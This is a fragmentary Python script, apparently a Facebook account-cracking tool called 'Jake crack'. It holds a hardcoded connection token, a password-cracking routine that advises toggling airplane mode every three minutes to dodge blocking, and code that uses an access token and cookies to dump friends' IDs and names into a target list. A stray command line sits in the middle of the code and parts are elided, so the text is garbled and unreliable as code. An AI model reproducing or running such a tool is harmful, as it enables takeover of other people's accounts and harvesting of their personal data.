...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def pasw(self):       
            ...
            print(f"\r{A}Use airplane mode every 3 minutes {S}")
            print(47*"-")
            print(f'{S} Total IDs : %s ' % len(self.id))
            print(f'{S} Jake crack started...')
            print(47*"-")
    ...
    try:
        ...
        for rept in range(srange):
            ...
            if  sid=='stop':
                ...
                ys.close()
            try:
     python jakeswu_crack.py           dmp = requests.get("https://graph.facebook.com/"+sid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['friends']['data']:
                    totaldmp+=1
                    apnd.write(idnm['id']+"|"+idnm['name']+'\n')                      
            except KeyError:
